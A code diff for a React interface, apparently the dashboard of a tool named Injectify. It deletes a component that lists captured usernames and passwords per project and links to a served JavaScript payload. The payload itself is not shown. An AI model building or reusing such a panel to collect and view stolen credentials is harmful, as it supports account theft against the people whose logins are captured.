@@ -15,8 +15,6 @@ import Dialog, {
 import Typography from 'material-ui/Typography'
 import Button from 'material-ui/Button'
 import IconButton from 'material-ui/IconButton'
-import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table'
-import Timestamp from 'react-timestamp'
 import Tooltip from 'material-ui/Tooltip'
 import PersistentDrawer from "./sidebar.jsx"
 
@@ -141,7 +139,7 @@ class Injectify extends Component {
 	render() {
 		return (
 			<app className="main">
-				<PersistentDrawer parentState={this.state} signIn={this.signIn.bind(this)} signOut={this.signOut.bind(this)}>
+				<PersistentDrawer parentState={this.state} signIn={this.signIn.bind(this)} signOut={this.signOut.bind(this)} emit={(a, b) => socket.emit(a, b)}>
 					{this.state.user.login ? (
 						<div>
 							<table>
@@ -151,7 +149,6 @@ class Injectify extends Component {
 									<tr><td>{this.state.user.bio}</td></tr>
 								</tbody>
 							</table>
-							<Projects projects={this.state.projects} projectData={this.state.project} />
 							<Button onClick={this.handleClickOpen}>New project</Button>
 							<Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
 								<DialogTitle>New project</DialogTitle>
@@ -188,120 +185,6 @@ class Injectify extends Component {
 				</PersistentDrawer>
 			</app>
 		)
-	}
-}
-
-class Records extends Component {
-	state = {
-		open: false
-	}
-
-	componentWillUpdate() {
-		this.scrollToBottom()
-	}
-
-	componentDidUpdate() {
-		if (this.props.projectData) this.scrollToBottom()
-	}
-
-	handleClickOpen = (a) => {
-		socket.emit("project:read", {
-			name: this.props.record
-		})
-		this.setState({ open: true });
-	};
-
-	handleRequestClose = () => {
-		socket.emit("project:close", {
-			name: this.props.record
-		})
-		this.setState({ open: false });
-	}
-
-	scrollToBottom = (hide) => {
-		const node = ReactDOM.findDOMNode(this.scrollContainer)
-		if (node) {
-			setTimeout(() =>{
-				try {
-					node.scrollTo({
-						'behavior': 'smooth',
-						'left': 0,
-						'top': node.scrollHeight
-					});
-				} catch(e) {
-					node.scrollTop = node.scrollHeight
-				}
-			}, 0)
-		}
-	}
-
-	viewJS = () => {
-		window.open("/payload/?project=" + encodeURIComponent(this.props.projectData.name))
-		console.log(token)
-	}
-
-	viewJSON = () => {
-		window.open("/api/" + encodeURIComponent(token) + "/" + encodeURIComponent(this.props.projectData.name) /*+ "&download=true"*/)
-		console.log(token)
-	}
-
-	render() {
-		let id = 0;
-		function createData(name, calories, fat, carbs, protein) {
-			id += 1;
-			return { id, name, calories, fat, carbs, protein };
-		}	  
-		return (
-			<div>
-				<Button onClick={this.handleClickOpen}>{this.props.record}</Button>
-				{this.props.projectData && this.props.projectData.name == this.props.record ? (
-					<Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
-						<DialogTitle>
-							<span>{`Project ${this.props.projectData.name}`}</span>
-						</DialogTitle>
-						<DialogContent ref={(el) => { this.scrollContainer = el }}>
-							<Table>
-								<TableHead>
-									<TableRow>
-										<TableCell width="400">Time</TableCell>
-										<TableCell>Username</TableCell>
-										<TableCell>Password</TableCell>
-										<TableCell>Details</TableCell>
-									</TableRow>
-								</TableHead>
-								<TableBody>
-									{this.props.projectData.passwords.map((record, i) => {
-										return (
-											<TableRow key={i}>
-												<TableCell className="time"><Timestamp time={record.timestamp} format='ago'/></TableCell>
-												<TableCell numeric>{record.username}</TableCell>
-												<TableCell numeric>{record.password}</TableCell>
-												<TableCell numeric>
-													<Button color="primary">
-														More
-													</Button>
-												</TableCell>
-											</TableRow>
-										);
-									})}
-									<tr ref={el => this.tableEnd = el} className="tableEnd"></tr>
-								</TableBody>
-							</Table>
-						</DialogContent>
-						<DialogActions>
-							<Tooltip title="Payload for this project" placement="left">
-								<Button onClick={this.viewJS} color="primary">
-									Javascript code
-								</Button>
-							</Tooltip>
-							<Button onClick={this.viewJSON} color="primary" autoFocus>
-								View JSON
-							</Button>
-						</DialogActions>
-					</Dialog>
-				) : null}
-			</div>
-		);
 	}
 }
 
